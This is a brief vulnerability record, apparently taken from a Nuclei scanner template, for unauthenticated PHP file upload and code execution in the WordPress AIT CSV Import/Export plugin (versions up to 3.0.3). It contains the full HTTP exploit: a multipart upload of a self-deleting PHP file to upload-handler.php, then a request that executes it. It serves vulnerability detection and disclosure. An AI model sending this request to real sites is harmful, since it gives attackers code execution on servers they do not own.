# Vulnerability: WordPress AIT CSV Import Export - Unauthenticated Remote Code Execution
**Classification:** CWE-434
**Source:** Nuclei Template (`ait-csv-import-export-rce.yaml`)

## Description
The AIT CSV Import/Export plugin <= 3.0.3 allows unauthenticated remote attackers to upload and execute arbitrary PHP code. The upload-handler does not require authentication, nor validates the uploaded content.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /wp-content/plugins/ait-csv-import-export/admin/upload-handler.php HTTP/1.1
Host: {{Hostname}}
Accept: */*
Content-Type: multipart/form-data; boundary=------------------------ab360007dbae2de8

--------------------------ab360007dbae2de8
Content-Disposition: form-data; name="file"; filename="{{randstr}}.php"
Content-Type: application/octet-stream

sep=;<?php echo md5("{{string}}");unlink(__FILE__);?>

--------------------------ab360007dbae2de8--

GET /wp-content/uploads/{{randstr}}.php HTTP/1.1
Host: {{Hostname}}
```

